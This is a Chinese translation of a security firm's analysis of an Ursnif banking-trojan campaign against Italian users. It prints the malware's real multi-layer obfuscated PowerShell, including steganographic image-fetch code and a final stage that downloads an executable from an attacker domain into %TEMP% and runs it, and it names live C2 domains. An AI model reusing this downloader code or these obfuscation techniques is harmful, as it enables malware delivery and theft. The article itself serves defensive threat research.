> 原文链接: https://www.anquanke.com//post/id/180524 


# Ursnif木马如何演变以实现对意大利的持续威胁


                                阅读量   
                                **196909**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者yoroi，文章来源：blog.yoroi.company
                                <br>原文地址：[https://blog.yoroi.company/research/how-ursnif-evolves-to-keep-threatening-italy/](https://blog.yoroi.company/research/how-ursnif-evolves-to-keep-threatening-italy/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t019c8039357c743641.png)](https://p2.ssl.qhimg.com/t019c8039357c743641.png)



## 前言

本文详细阐述近期Ursnif木马的不断演变，包括其日益复杂的感染链、针对windows 10的新隐写技术以及重度的代码混淆。





## 简介

几个月来，意大利用户一直饱受着携带有臭名昭著Ursnif木马变体的恶意垃圾邮件攻击。Yoroi-Cybaze ZLab密切关注这些活动并展开分析，以跟踪其技术的发展和感染链的演变，可以观察到其变得越来越复杂化。例如，最近的攻击活动中通过实现对不同国家的检查来提高其目标的针对性能力，并通过重度的代码混淆来提高其反分析能力。

在[之前的文章](https://blog.yoroi.company/research/ursnif-the-latest-evolution-of-the-most-popular-banking-malware/)中，我们列举了Unsnif恶意软件威胁的背后，恶意攻击者所使用的样本传播方式和主要的网络攻击手段（TTPs：Tactics, Techniques, and Procedures）。事实上，在本篇报告中，我们将详细阐述近期日益复杂的感染链，除了为windows 10设计的一种新隐写技术外，还涵盖了高级别的混淆技术。



## 技术分析

[![](https://p3.ssl.qhimg.com/t019bd2ec27d1e80d4d.png)](https://p3.ssl.qhimg.com/t019bd2ec27d1e80d4d.png)

攻击者仍然利用恶意Excel文档来诱导其目标启动感染链，这是启用隐藏在这些攻击向量中的宏代码所必需的环节。

[![](https://p5.ssl.qhimg.com/t01392384d4d1b87547.png)](https://p5.ssl.qhimg.com/t01392384d4d1b87547.png)

一旦打开文档，一个伪造的模糊图像会邀请受害者启用内容，以启动恶意宏代码（如上图左侧所示）。但是，将模糊的图像移开后会发现，A1单元格内包含隐藏代码：其内容是base64编码的脚本。

[![](https://p0.ssl.qhimg.com/t015a9b6504f7a36c15.png)](https://p0.ssl.qhimg.com/t015a9b6504f7a36c15.png)

如图所示，宏代码从文档的第一个单元格中开始检索内容，然后将其与后续的6行内容连接起来。它的执行启动了感染的“powershell阶段”：一系列的多层混淆脚本。

```
代码片段1:
powershell.exe -EP bYpass IEx (‘$w=’OBFUSCATED PAYLOAD ZERO‘;$v=[IO.COmpresSIon.comPresSiONmOde];$j=20*60;sal M neW-OBJeCt;$e=[TexT.ENcoDiNG]::ASCiI;(M io.sTreAmreAdER((M Io.coMPREsSIoN.dEfLatesTReam([Io.meMORySTrEam][CoNVERt]::FRomBase64STRINg($w),$v::decOMpREss)),$e)).reaDTOEnD()|&amp;($PshOME[4]+$PshoMe[34]+”x”)’)
```



## Powershell 阶段

在第一层的混淆中，我们注意到变量`“$j”`的声明，该变量在混淆处理的下一步中用于通过`Sleep`库函数的调用来延迟脚本的执行。

```
代码片段2:
$b=’i’+$sHeLlid[13]+’X’;if ([Environment]::OSVersion.Version.Major -ne ’10’) `{`Sleep $j;.($b)(M sYSTEm.Io.CoMpresSiOn.DEFlatestReam([sySTeM.Io.MeMoRYsTREAm] [cOnveRt]::FrOMbASe64stRinG(‘ OBFUSCATED PAYLOAD ONE ‘),$v::DecOMprESs)|%`{`M syStEM.Io.sTReAmrEADEr($_,[TexT.ENcoDiNG]::ASCIi)`}`).READtoenD()`}`else `{`$h=’$y=@( OBFUSCATED PAYLOAD TWO )’.replace(‘c’,’,0,’);$h=$h.replace(‘b’,’,101,’);$h=$h.replace(‘a’,’,0,0,0,’);.($b)($h);[Reflection.Assembly]::Load([byte[]]$y)|Out-Null;.($b)([SA.Sii]::pf())`}`
```

该阶段有趣的一点是其会检查安装在受害者计算机上的windows版本，上面的代码片段中包含一个`if`条件语句，来决定执行哪一个分支的感染链。如果目标版本不是windows 10，恶意软件会运行`OBFUSCATED PAYLOAD ONE`（另外一个分支将会在`The Windows 10分支`章节中阐述）。在`OBFUSCATED PAYLOAD ONE`分支中，其下一步是：

```
代码片段3:
&amp;(“`{`1`}``{`0`}`” -f’x’,’IE’) (((‘.(D’+’Nn’+'`{`0’+’`}``{`1’+’`}`DN’+’n-f’+(“`{`0`}``{`1`}`”-f ‘ fI’,’Qs’)+(“`{`0`}``{`1`}`”-f ‘fIQ’,’,’)+(“`{`0`}``{`1`}`” -f’fIQ’,’a’)+(“`{`0`}``{`1`}`”-f’lfI’,’Q’)+(((“`{`0`}``{`1`}``{`2`}`” -f ‘)’,’ Dfi i’,’ex’)))+’;.’+'(‘+’DNn`{`0`}``{`‘+’1`}`DNn’+’ ‘+’-f’+’fI’+(“`{`0`}``{`3`}``{`2`}``{`1`}`” -f ‘QS’,’Q’,’Q,fI’,’afI’)+’lf’+(((“`{`0`}``{`2`}``{`1`}`”-f’I’,’L n’,’Q) ‘)))+’e’+(“`{`2`}``{`1`}``{`0`}`”-f’;’,’t’,’w-objeC’)+’f’+’1’+’e`{`c’+’1`}`=((‘+'(DN’+’n`{`‘+’6’+’`}`’+'`{`3`}`’+'`{`10`}`’+'`{`‘+’4`}``{`8`}``{`‘+’5’+’`}``{`‘+’2’+’`}``{`11’+’`}``{`‘+’1`}``{`9`}``{`0’+’`}``{`7`}`DNn -f fIQ’+’w’+’f’+(“`{`0`}``{`2`}``{`1`}``{`3`}`” -f’IQ,f’,’awfI’,’IQ’,’Q,fI’)+(“`{`2`}``{`1`}``{`0`}`”-f’ ‘,’me’,’QNa’)+’Df’+’I’+(“`{`0`}``{`1`}`” -f’Q,’,’fIQ’)+’dd’+(“`{`0`}``{`1`}`”-f’-T’,’fI’)+(“`{`1`}``{`0`}`”-f ‘Q’,’Q,fI’)+’-Af’+’IQ,’+(“`{`1`}``{`0`}`” -f ‘Qb’,’fI’)+(“`{`0`}``{`1`}``{`2`}`” -f’l’,’yfIQ,’,’fIQA’)+(“`{`1`}``{`0`}`”-f ‘,f’,’fIQ’)+’IQ’+(“`{`0`}``{`1`}`”-f’;f’,’IQ,’)+’f’+’I’+(“`{`1`}``{`0`}`” -f’sse’,’Q’)+(“`{`0`}``{`1`}``{`2`}`” -f ‘m’,’fI’,’Q,fIQi’)+’n’+(“`{`1`}``{`0`}`” -f’D6fI’,’g’)+(“`{`1`}``{`0`}`” -f ‘,fIQype’,’Q’)+(“`{`0`}``{`1`}`” -f ‘ ‘,’fIQ’)+’,’+(“`{`0`}``{`1`}`”-f ‘fIQ’,’6wSyst’)+(“`{`0`}``{`2`}``{`1`}`” -f ’em.D’,’f’,’r’)+(((“`{`1`}``{`3`}``{`2`}``{`0`}`”-f ‘reS1ZP’,’IQ)).D’,’n’,’N’)))+’L’+(((“`{`1`}``{`0`}``{`2`}`” -f ‘C’,’A’,’eDNn(([‘)))+(“`{`1`}``{`2`}``{`3`}``{`0`}`” -f ‘A’,’ChA’,’r]68+’,'[Ch’)+’r]’+(“`{`0`}``{`1`}`” -f ’54’,’+[‘)+(“`{`1`}``{`0`}`” -f’1′,’ChAr]1′)+’9’+’),[‘+’sT’+’ri’+(“`{`1`}``{`0`}`”-f’][C’,’NG’)+’hA’+(“`{`0`}``{`1`}`” -f’r]’,’39’)+’));’+’f1e`{`c2`}`’+’=’+’f’+’I’+(“`{`1`}``{`0`}`”-f’f1e’,’Q’)+’tm’+’=f’+’IQ’+(“`{`1`}``{`0`}`” -f’h’,’fIQ’)+’t’+(“`{`0`}``{`1`}`” -f’tps:’,’/’)+(“`{`1`}``{`0`}`” -f ‘ima’,’/’)+’ges’+(“`{`0`}``{`1`}`”-f ‘2.imgb’,’o’)+’x’+’.c’+’o’+’m/d’+’8’+(“`{`1`}``{`2`}``{`0`}`”-f’u’,’/0′,’e/eyGV’)+’p7s’+’_o.’+(“`{`1`}``{`0`}`” -f’fIQ’,’pngfIQ’)+’;f’+’1e’+’r’+’y =’+(“`{`0`}``{`1`}`” -f’ [Sys’,’te’)+’m.N’+(“`{`1`}``{`0`}`”-f’ebR’,’et.W’)+’equ’+’es’+(“`{`0`}``{`1`}``{`2`}`”-f ‘t’,’]::’,’Creat’)+(((“`{`0`}``{`1`}`” -f ‘e(‘,’f1e’)))+’t’+’m);’+(“`{`0`}``{`1`}`” -f ‘f1′,’ery’)+’.Me’+(“`{`1`}``{`0`}`” -f ‘od =’,’th’)+’ f’+’I’+’QfI’+’QH’+(“`{`0`}``{`1`}`” -f’E’,’ADf’)+(“`{`1`}``{`2`}``{`0`}`”-f ‘;f1′,’IQ’,’fIQ’)+’e’+’ra’+’ ‘+’= f’+(“`{`0`}``{`1`}`” -f ‘1e’,’ry.’)+’G’+’etR’+’es’+(“`{`0`}``{`1`}`” -f ‘pon’,’s’)+(“`{`1`}``{`2`}``{`0`}`”-f ‘g’,’e(‘,’);f1e’)+’=’+’L ‘+’Sy’+’st’+’e’+’m’+’.’+’D’+’ra’+(((“`{`4`}``{`3`}``{`2`}``{`0`}``{`1`}`”-f’m’,’ap((‘,’t’,’g.Bi’,’win’)))+’L’+’ ‘+(“`{`1`}``{`2`}``{`0`}`” -f’ebC’,’Net.’,’W’)+(((“`{`2`}``{`1`}``{`3`}``{`0`}`” -f’.Ope’,’ien’,’l’,’t)’)))+’n’+’Rea’+(((“`{`1`}``{`0`}``{`2`}`” -f’t’,’d(f1e’,’m))’)))+(“`{`2`}``{`0`}``{`1`}`” -f ‘eo=’,’L’,’;f1′)+’ B’+’yte’+(“`{`1`}``{`0`}`”-f ‘ 165′,'[]’)+’60’+(((“`{`0`}``{`1`}`” -f ‘;’,'(0..’)))+’35)’+’uXc’+’%’+'`{`‘+(((“`{`2`}``{`0`}``{`1`}`” -f’each’,'(f’,’for’)))+’1ex’+(((“`{`1`}``{`0`}`” -f’in(‘,’ ‘)))+’0.’+’.4’+’59)’+’)`{`f’+’1ep’+(“`{`0`}``{`1`}`”-f’=f’,’1e’)+(“`{`1`}``{`0`}`” -f ‘et’,’g.G’)+(((“`{`0`}``{`1`}``{`3`}``{`2`}`”-f ‘Pixe’,’l(‘,’ex,’,’f1′)))+(((“`{`1`}``{`0`}``{`2`}`” -f ‘1e_’,’f’,’);’)))+’f1’+’e’+(“`{`2`}``{`1`}``{`0`}`”-f ‘6’,’1e_*4′,’o[f’)+’0+f’+’1’+’e’+’x’+(((“`{`0`}``{`1`}``{`3`}``{`2`}`”-f’]=(‘,'[math]’,’F’,’::’)))+’lo’+(((“`{`0`}``{`1`}`” -f’o’,’r((f’)))+’1’+’ep.’+(((“`{`1`}``{`0`}`”-f ’15)’,’B-band’)))+’*’+’16)’+’-b’+’o’+’r(f1e`{`‘+’P’+’`}`.DN’+(“`{`1`}``{`2`}``{`0`}`”-f ‘Nn-b’,’ng’,’D’)+’a’+(“`{`0`}``{`1`}`” -f ‘n’,’d 15′)+’))’+’`}`;f1ekk=’+'[S’+(“`{`0`}``{`1`}``{`2`}`”-f’yste’,’m’,’.Tex’)+’t.’+(“`{`0`}``{`2`}``{`1`}`”-f ‘En’,’di’,’co’)+(“`{`0`}``{`1`}``{`2`}`” -f’n’,’g]::UT’,’F8′)+(“`{`1`}``{`0`}``{`2`}`”-f ‘Get’,’.’,’Str’)+(((“`{`0`}``{`1`}`” -f’ing’,'(‘)))+’f’+’1eo’+'[‘+’0.’+’.’+’162’+’8’+’6])`}`fIQ;&amp;’+'(D’+’Nn`{`‘+’0`}``{`1`}`DNn -ffI’+(“`{`0`}``{`1`}`” -f’Qd’,’fIQ,’)+’fI’+(((“`{`0`}``{`1`}`” -f ‘Qfi’,’fIQ) ‘)))+’f1e’+’C1f’+’1ec’+(“`{`0`}``{`1`}`”-f’2uX’,’c’)+’&amp;(DNn`{`1`}``{`0’+’`}`DN’+’n’+’-‘+(“`{`1`}``{`0`}`” -f ‘fIQ’,’f’)+(“`{`2`}``{`1`}``{`0`}`” -f ‘,f’,’Q’,’ifI’)+’IQ’+(((“`{`1`}``{`0`}``{`2`}`”-f’IQ’,’dff’,’);f’)))+’1e`{`kk`}`uXc.(DN’+’n’+'`{`1’+’`}`’+'`{`0`}`D’+’N’+’n-f’+(“`{`1`}``{`2`}``{`0`}`”-f’Q’,’fIQi’,’fI’)+’,’+’f’+’IQd’+’ffI’+’Q)’)-CrePlacE([CHAr]68+[CHAr]78+[CHAr]110),[CHAr]34  -REPLace([CHAr]117+[CHAr]88+[CHAr]99),[CHAr]124 -CrePlacE’f1e’,[CHAr]36 -REPLace ([CHAr]83+[CHAr]49+[CHAr]90),[CHAr]96 -CrePlacE ([CHAr]102+[CHAr]73+[CHAr]81),[CHAr]39) )
```

产生如下代码片段：

```
代码片段4:
.(“`{`0`}``{`1`}`”-f ‘s’,’al’) Dfi iex;.(“`{`0`}``{`1`}`” -f’Sa’,’l’) L new-objeCt;$`{`c1`}`=(((“`{`6`}``{`3`}``{`10`}``{`4`}``{`8`}``{`5`}``{`2`}``{`11`}``{`1`}``{`9`}``{`0`}``{`7`}`” -f ‘w’,’aw’,’Name D’,’dd-T’,’-A’,’bly’,’A’,’;’,’ssem’,’ingD6′,’ype ‘,’6wSystem.Dr’)).”re`PLACe”(([ChAr]68+[ChAr]54+[ChAr]119),[sTriNG][ChAr]39));$`{`c2`}`=’$tm=”https://images2.imgbox.com/d8/0e/eyGVup7s_o.png”;$ry = [System.Net.WebRequest]::Create($tm);$ry.Method = ”HEAD”;$ra = $ry.GetResponse();$g=L System.Drawing.Bitmap((L Net.WebClient).OpenRead($tm));$o=L Byte[] 16560;(0..35)|%`{`foreach($x in(0..459))`{`$p=$g.GetPixel($x,$_);$o[$_*460+$x]=([math]::Floor(($p.B-band15)*16)-bor($`{`P`}`.”g”-band 15))`}`;$kk=[System.Text.Encoding]::UTF8.GetString($o[0..16286])`}`’;&amp;(“`{`0`}``{`1`}`” -f’d’,’fi’) $C1$c2|&amp;(“`{`1`}``{`0`}`”-f’i’,’df’);$`{`kk`}`|.(“`{`1`}``{`0`}`”-f’i’,’df’)
```

这段代码在ursnif感染链中很常见，其功能是从图片共享平台（例如imgbox.com）上下载特定的PNG图像。该图像通过已经阐述的[LSB隐写技术](https://blog.yoroi.company/research/ursnif-long-live-the-steganography/)，隐藏着下一步的powershell代码。

[![](https://p3.ssl.qhimg.com/t016b48b0a3807fbfff.png)](https://p3.ssl.qhimg.com/t016b48b0a3807fbfff.png)

这张看似无害的图像中隐藏的代码如下：

```
代码片段5:
if((g`E`T-date -uformat (‘%B’)) -like (“`{`1`}``{`0`}`”-f’gg*’,’*’))`{`&amp; ( $vERboSEPrefeRENCE.TosTRInG()[1,3]+’x’-Join”)(New-OBJeCT  Io.COmpREssiOn.DefLatEStREAm( [Io.MemORySTream] [ConvErt]::fRoMBAse64STrING(‘ OBFUSCATED PAYLOAD THREE ‘ ), [Io.compREsSIon.ComPrEssIoNmODE]::dECOMprEsS ) | foreaCH-obJect`{` New-OBJeCT SYstEM.io.StreAmREAdER($_,[TExt.ENcodINg]::ASCII )`}`).reADtoEnD()`}`
```

仔细观察代码的第一行，可以注意到只有在特定条件满足时才会执行此代码：它检索当前日期，提取其中的月份字段，在本示例中是5月（意大利语的Maggio），并将其与正则表达式`*gg*`进行比较。此检查确保目标用户是意大利用户，并根据活动时间跨度运行该样本。一旦条件满足，将执行`OBFUSCATED PAYLOAD THREE`，揭示另一个混淆层。

```
代码片段6:
” $( sET  ‘OFs’ ”)”+ [sTRiNG]( ‘ OBFUSCATED PAYLOAD FOUR ‘ -sPLIT’@’-sPLiT ‘&amp;’ -SPlIt ‘B’-spLIT’t’-SPliT ‘Y’-spLiT ‘e’-spLIt ‘:’ -sPLIt'&lt;‘ -sPLIt ‘m’-SPLit ‘n’ | FOrEACh-obJEcT`{` ([CoNvERt]::ToinT16(( $_.tOStrinG() ) , 8)-AS[chaR]) `}`) +” $( Set-itEM  ‘VArIAblE:ofS’ ‘ ‘ )” |&amp;((gV ‘*mdR*’).nAME[3,11,2]-JOIn”)
```

第四个PAYLOAD基本上是以十六进制编码的，添加了其他的特定字符，并且可以通过`[Convert]::ToInt16()`函数进行恢复。由此揭开另一层混淆：

```
代码片段7:
(NeW-ObJEct syStEm.iO.compReSsIOn.dEfLatESTrEAM([Io.MeMoRySTReAm] [sYsteM.COnveRT]::fRombAsE64sTRINg(‘ OBFUSCATED PAYLOAD FIVE ‘),[sYstEm.Io.CompREsSIoN.cOmprEsSIonmoDE]::DeCoMPress )| FOrEACH `{`NeW-ObJEct SYstem.iO.StREaMREadER($_, [sYsTEm.tExT.eNCodinG]::aSCii )`}`).Readtoend() | &amp; ( $enV:COmSpeC[4,26,25]-join”)
```

第五个payload是一段压缩的base64编码字符串，立即解压并执行，进入第六步payload：

```
代码片段8:
(‘ OBFUSCATED PAYLOAD SIX ‘.SpLit( ‘V%JLg&lt;,t`}`y’)|foreaCh`{`[cHaR]( $_-bxOr’0x52′ )`}`) -jOIn ”| &amp; ((vaRiABlE ‘*MDR*’).NamE[3,11,2]-join”)
```

这一混淆层不同寻常，因为其包含一段大量垃圾字符串的十六进制代码，事实上，利用`0x52`进行异或加密，其结果如下：

```
代码片段9:
 ((vari`A`BlE (“`{`1`}``{`0`}`” -f’r*’,’*md’)).”n`Ame”[3,11,2]-jOiN”) ((‘&amp;(iIm`{`0`}``{`1`}`iIm-f6c0wr6c0,6c0it’+’e’+(“`{`9`}``{`4`}``{`1`}``{`10`}``{`0`}``{`7`}``{`5`}``{`6`}``{`8`}``{`2`}``{`3`}`”-f’00000000′,’0′,’000;&amp;’,'(‘,’) 0′,’00’,’0′,’0000000′,’00000′,’6c0′,’0′)+’iIm`{`1`}``{`0`}`iIm-f 6c0p6c0,6c0slee6c0) (5*20);i’+(((“`{`6`}``{`5`}``{`2`}``{`4`}``{`0`}``{`3`}``{`7`}``{`8`}``{`1`}``{`9`}`”-f ‘+’,’0Xb’,’ ((6c0HKC’,’6c0′,’6c0′,’6c0)’,’f((&amp;(6c0gp’,’U:6c0+’,’6c’,’D’)))+(“`{`7`}``{`0`}``{`8`}``{`2`}``{`3`}``{`9`}``{`1`}``{`6`}``{`4`}``{`5`}``{`10`}`” -f’6c0+6′,’c0b’,’6c0′,’+6c0′,’c0+6c0Deskt6c0+’,’6c’,’D6′,’Con’,’c0trol ‘,’PanelX6c0+6′,’0op6c’)+(“`{`8`}``{`10`}``{`6`}``{`2`}``{`1`}``{`0`}``{`9`}``{`3`}``{`7`}``{`4`}``{`5`}`”-f ‘(‘,’E’,’c’,’CHar]88′,’]98′,’+[CHar]’,’la’,’+[CHar’,’0) -cRE’,'[‘,’p’)+(((“`{`1`}``{`0`}``{`2`}`” -f’8),[C’,’6′,’Har’)))+’]92) o6F .(iIm`{`0`}``{`1`}`iIm-f 6c0Sele6c0,6c0ct6c0) -Property (6c0*6c0)).iImprEFEr4xTRE4xTD’+(“`{`0`}``{`1`}``{`2`}`” -f’U4x’,’T’,’I4xTl’)+(“`{`0`}``{`3`}``{`1`}``{`2`}`” -f ‘A’,’UAG’,’esiIm’,’NG’)+(((“`{`0`}``{`2`}``{`1`}``{`3`}`”-f’ -l’,’ke (‘,’i’,’6c0′)))+’*t-6c0+6c0I*6c0))`{`lH0`{`gO`}`’+(((“`{`3`}``{`1`}``{`14`}``{`2`}``{`16`}``{`7`}``{`0`}``{`6`}``{`5`}``{`9`}``{`12`}``{`10`}``{`13`}``{`4`}``{`11`}``{`8`}``{`15`}`” -f’6c0′,’c0htt’,’c0+6c0//’,’=(6′,’fo’,’tindef.6′,’a’,’d6c0+’,’/6c0+6c0///6c0+6c0/6c0+6c0/6c’,’c’,’c0in6c0+6c’,’6c0+6c0/’,’0+6′,’0′,’ps:6′,’0+6c0′,’newup’)))+(“`{`3`}``{`5`}``{`0`}``{`1`}``{`2`}``{`4`}`”-f ‘..6′,’c0+’,’6c0..6c’,’/….6c0+6c0′,’0+’,’..’)+(“`{`1`}``{`0`}``{`2`}``{`3`}`” -f ‘c0.e6c0+’,’6′,’6c0x’,’e’)+’6c0),iImiIm;foreach(lH0`{`u`}` in lH0`{`G4xTO`}`)`{`Try`{`lH0`{`R4xTI`}` = iImlH0env:temp8SdTwain002.exei’+’Im;lH0`{`k4x’+’Tl`}` ‘+’= &amp;(iIm`{`1`}``{`2`}``{`0`}`iIm -f6’+’c0ect6c0,6c0New-O6c0,6c0bj6c0) (iIm`{`5`}``{`4`}``{`1`}``{`‘+’0`}``{`3`}``{`2`}`iIm-f6c0eb6c0,6c0tem.Net.W6c0,6c0t6c0’+’,6c0Clien6c0,6c0s6c0,6c0Sy6c0);lH0`{`K4xTL`}`.iImHEA4xTDErsiIm.(iIm`{`0`}``{`1`}`iIm-f 6c0Ad6’+(((“`{`17`}``{`26`}``{`11`}``{`0`}``{`6`}``{`16`}``{`20`}``{`1`}``{`3`}``{`23`}``{`9`}``{`13`}``{`8`}``{`22`}``{`18`}``{`19`}``{`4`}``{`14`}``{`15`}``{`21`}``{`25`}``{`24`}``{`2`}``{`5`}``{`12`}``{`7`}``{`10`}`”-f’c’,’e((6c0′,’c0Win’,’use’,’,(6c0Moz’,’dow6′,’0′,’0+’,’-age’,’c0+’,’6c’,’,6′,’c’,’6c0r’,’illa6c0′,’+’,’d’,’c’,’6c0′,’t6c0)’,’6c0).Invok’,’6c0/5.’,’n6c0+’,’6′,’0+6′,’0 (6c’,’0′)))+(“`{`5`}``{`1`}``{`9`}``{`7`}``{`12`}``{`2`}``{`0`}``{`11`}``{`8`}``{`3`}``{`6`}``{`10`}``{`4`}`”-f ‘6’,’0+’,’in’,’6c0+6c0 ‘,’ ‘,’0s6c’,’x64;6′,’ NT 10.0; ‘,’;’,’6c0′,’c0+6c0′,’4′,’W’)+(“`{`6`}``{`2`}``{`0`}``{`5`}``{`4`}``{`7`}``{`1`}``{`3`}`” -f’r’,’v:’,’0+6c0′,’66.06c0+6′,’+6c’,’6c0′,’6c’,’0′)+(((“`{`2`}``{`6`}``{`3`}``{`0`}``{`5`}``{`4`}``{`1`}`”-f’0+’,’+’,’c0) Gec6c0+6′,’0k6c’,’6c0′,’6c0o’,’c’)))+(“`{`2`}``{`4`}``{`8`}``{`6`}``{`1`}``{`5`}``{`0`}``{`3`}``{`7`}`”-f ’00’,’c0+6′,’6c0/206c0+’,’6c0+’,’6′,’c’,’016′,’6′,’c’)+(“`{`1`}``{`0`}`”-f’001′,’c’)+(“`{`0`}``{`1`}``{`2`}`”-f ‘6’,’c0+6c’,’0′)+(“`{`1`}``{`0`}``{`2`}`”-f ‘+6′,’016c0′,’c0 Fi’)+(((“`{`0`}``{`6`}``{`9`}``{`4`}``{`8`}``{`2`}``{`7`}``{`3`}``{`5`}``{`1`}`”-f’re6′,’006c0))’,’6′,’6c0+6′,’/’,’c’,’c0+6c’,’c0+6c06.’,’6′,’0fox’)))+’;lH0`{`KL`}`.(iIm`{`2`}``{`1`}``{`3`}``{`0`}`iIm -f6c0e6c0,6c0nload6c0,6c0Do’+’w6’+’c0,6c0Fil6c0).Invoke(lH0`{`u`}`’+’, lH0`{`rI’+’`}`);if((lH0`{`hO4xTst`}`.iImCurr’+’4xTentc4xTUl4xTTuREiImo6F .(iIm`{`1`}``{`0`}``{`2`}`iIm-f6c0t-Str’+(((“`{`2`}``{`5`}``{`0`}``{`8`}``{`3`}``{`4`}``{`10`}``{`6`}``{`7`}``{`9`}``{`1`}`” -f ‘0,6’,’0*a6c0′,’6′,’Ou6c0,’,’6c0′,’c’,’0)) -li’,’ke (‘,’c0′,’6c’,’ing6c’)))+’+6c0li*6c0))`{`&amp;(iIm`{`0`}``{`1`}`iIm-f6c’+’0’+(“`{`3`}``{`2`}``{`1`}``{`0`}`” -f’0ps’,’c0,6c’,’6′,’Sa’)+’6c0’+’) lH0`{`RI`}`;break`}``}`Catch`{`.(iIm`{`‘+’2`}``{`1`}``{`3`}``{`0`}`iIm-f 6c0ost6c0,6c0te-6c0,6c0Wri6c0,6c0H6c0) lH0`{`_`}`.iImExce4xTPt4xTiON’+(“`{`1`}``{`2`}``{`3`}``{`0`}``{`4`}`”-f’s’,’i’,’Im.iIm’,’ME’,’4xTs4xTAgE’)+’iIm`}``}``}`’).”r`EpLAcE”(([cHAR]111+[cHAR]54+[cHAR]70),[stRiNg][cHAR]124).(‘r’+’eplA’+’cE’).Invoke(‘8Sd’,’’).”R`E`PLace”(([cHAR]52+[cHAR]120+[cHAR]84),[stRiNg][cHAR]96).”REp`la`Ce”(([cHAR]105+[cHAR]73+[cHAR]109),[stRiNg][cHAR]34).”r`e`pLaCE”(‘lH0’,[stRiNg][cHAR]36).”r`EplA`Ce”(([cHAR]54+[cHAR]99+[cHAR]48),[stRiNg][cHAR]39))
```

至此，代码已经相对清晰了。我们注意到，有一些额外的替换操作来混淆代码，因此，我们进入混淆的最后一步：

```
代码片段10:
&amp;(“`{`0`}``{`1`}`”-f’wr’,’ite’) 00000000000000000000000000000;&amp;(“`{`1`}``{`0`}`”-f ‘p’,’slee’) (5*20);if((&amp;(‘gp’) ((‘HKC’+’U:’+’XbDCon’+’trol ‘+’PanelX’+’bD’+’Deskt’+’op’) -cREplacE([CHar]88+[CHar]98+[CHar]68),[CHar]92) | .(“`{`0`}``{`1`}`”-f ‘Sele’,’ct’) -Property (‘*’)).”prEFEr`RE`DU`I`lANGUAGes” -like (‘*t-‘+’I*‘))`{`$`{`gO`}`=(‘https:’+’//newupd’+’atindef.’+’in’+’fo’+’//’+’///’+’/’+’/’+’/….’+’….’+’..’+’.e’+’xe’),””;foreach($`{`u`}` in $`{`G`O`}`)`{`Try`{`$`{`R`I`}` = “$env:tempTwain002.exe”;$`{`k`l`}` = &amp;(“`{`1`}``{`2`}``{`0`}`” -f’ect’,’New-O’,’bj’) (“`{`5`}``{`4`}``{`1`}``{`0`}``{`3`}``{`2`}`”-f’eb’,’tem.Net.W’,’t’,’Clien’,’s’,’Sy’);$`{`K`L`}`.”HEA`DErs”.(“`{`0`}``{`1`}`”-f ‘Ad’,’d’).Invoke((‘use’+’r-agen’+’t’),(‘Mozilla’+’/5.0 (‘+’Window’+’s’+’ NT 10.0; Win64;’+’ x64;’+’ ‘+’r’+’v:66.0’+’) Gec’+’k’+’o’+’/20’+’1’+’0’+’01’+’01’+’ Fire’+’fox/6’+’6.’+’0′));$`{`KL`}`.(“`{`2`}``{`1`}``{`3`}``{`0`}`” -f’e’,’nload’,’Dow’,’Fil’).Invoke($`{`u`}`, $`{`rI`}`);if(($`{`hO`st`}`.”Curr`entc`Ul`TuRE”| .(“`{`1`}``{`0`}``{`2`}`”-f’t-Str’,’Ou’,’ing’)) -like (‘*a’+’li*’))`{`&amp;(“`{`0`}``{`1`}`”-f’Sa’,’ps’) $`{`RI`}`;break`}``}`Catch`{`.(“`{`2`}``{`1`}``{`3`}``{`0`}`”-f ‘ost’,’te-‘,’Wri’,’H’) $`{`_`}`.”Exce`Pt`iON”.”MEs`s`AgE”`}``}``}`
```

这是最后一步，也是`powershell stage`中至关重要的一步。实际上，该步骤的目的从一个非常隐蔽的站点位置下载一个PE32 payload，移动到`%TEMP%`路径然后执行它。



## 加载器

至此，我们分析了一系列难以置信的复杂powershell代码片段，但是，我们也不要忘记PE32 payload。

[![](https://p2.ssl.qhimg.com/t019de0cc7bfffeaa12.png)](https://p2.ssl.qhimg.com/t019de0cc7bfffeaa12.png)

该样本是一个典型的ursnif dll加载程序，能够将恶意代码注入到`explorer.exe`进程中，该特定样本已从`loaidifds[.club`服务端下载。

[![](https://p5.ssl.qhimg.com/t01f29b3c6e61364b6b.png)](https://p5.ssl.qhimg.com/t01f29b3c6e61364b6b.png)

最终的payload只是一个base64编码的可执行程序：将要注入到`explorer.exe`进程中的dll。



## payload有效载荷

[![](https://p4.ssl.qhimg.com/t01b1c45fe78ece564a.png)](https://p4.ssl.qhimg.com/t01b1c45fe78ece564a.png)

这是一个典型的ursnif恶意payload。为了提取出一些有意思的数据，我们手动对其进行分析。

[![](https://p4.ssl.qhimg.com/t0129f5fc96cb7bdd66.png)](https://p4.ssl.qhimg.com/t0129f5fc96cb7bdd66.png)

在检查dll时，我们发现其在配置文件中包含3个C2的引用。在分析的过程中，前两个C2，`filomilalno[.club`和`fileneopolo[.online`仍然活跃。此外，通过分析dll，我们发现了一些其他有趣的配置字符串信息，将会在配置字符串章节详细阐述。



## Windows 10 分支流程

回看**代码片段2**，我们提到了其对安装的windows操作系统版本的检查。这里，我们将继续分析其另一个控制流程的分支，即windows 10分支：

```
代码片段11:
$h=’$y=@( OBFUSCATED PAYLOAD TWO )’.replace(‘c’,’,0,’);$h=$h.replace(‘b’,’,101,’);$h=$h.replace(‘a’,’,0,0,0,’);.($b)($h);[Reflection.Assembly]::Load([byte[]]$y)|Out-Null;.($b)([SA.Sii]::pf())
```

指令的结构非常简单：PAYLOAD TWO实际上是一个十进制数字序列，随即被其他字符替换。替换完成后，通过一下命令来执行payload：

```
[Reflection.Assembly]::Load([byte[]]$y)
```

这意味着变量`$Y`的内容实际上是.NET动态链接库。它具有以下静态信息：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0160327be481eef6aa.png)

